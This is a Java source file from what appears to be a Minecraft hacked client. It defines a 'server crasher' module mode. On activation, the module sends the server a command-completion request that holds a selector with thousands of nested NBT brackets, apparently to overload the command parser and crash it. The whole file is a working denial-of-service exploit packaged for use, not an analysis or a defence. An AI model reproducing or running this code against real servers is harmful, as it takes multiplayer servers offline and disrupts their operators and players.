/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.impl;

import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class Brigadier2ModuleMode extends ModuleMulti<ServerCrasherModule> {

    private final IntegerValue count = new IntegerValue(
            this,
            "Count",
            "The amount of times the command should be executed.",
            1000,
            1,
            10000
    );

    public Brigadier2ModuleMode(final ServerCrasherModule parent) {
        super("Brigadier", parent);
    }

    @Override
    public void onActivate() {
        this.mc.getNetworkHandler().getConnection().send(new RequestCommandCompletionsC2SPacket(
                this.mc.getNetworkHandler().getCommandSource().completionId + 1,
                "/minecraft:tell @a[nbt=" + "{a:[".repeat(this.count.getValue()) + "]}".repeat(this.count.getValue()) + "}] a"
        ), null, true);
        this.parent.deactivate();
    }

}
